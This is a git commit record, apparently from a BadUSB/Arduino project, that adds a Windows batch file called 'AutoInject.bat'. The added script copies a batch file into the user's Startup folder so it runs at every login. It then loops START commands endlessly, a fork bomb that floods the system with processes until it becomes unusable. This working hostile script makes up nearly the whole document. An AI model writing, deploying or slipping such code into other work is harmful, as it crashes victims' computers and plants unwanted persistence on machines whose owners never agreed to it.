da9ea3581aa29505c7e0eb194b09a158b00cfba9
eliassolo <66207330+eliassolo@users.noreply.github.com>
2023-10-27 12:22:31 +0300

    Same as badUsb but written in batch

---
+++ arduino/AutoInject.bat
@@ -0,0 +1,11 @@
+@echo off
+
+xcopy /y %CD%Giagiaka.bat C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\
+
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
+
+:A
+START
+START
+START
+GOTO A
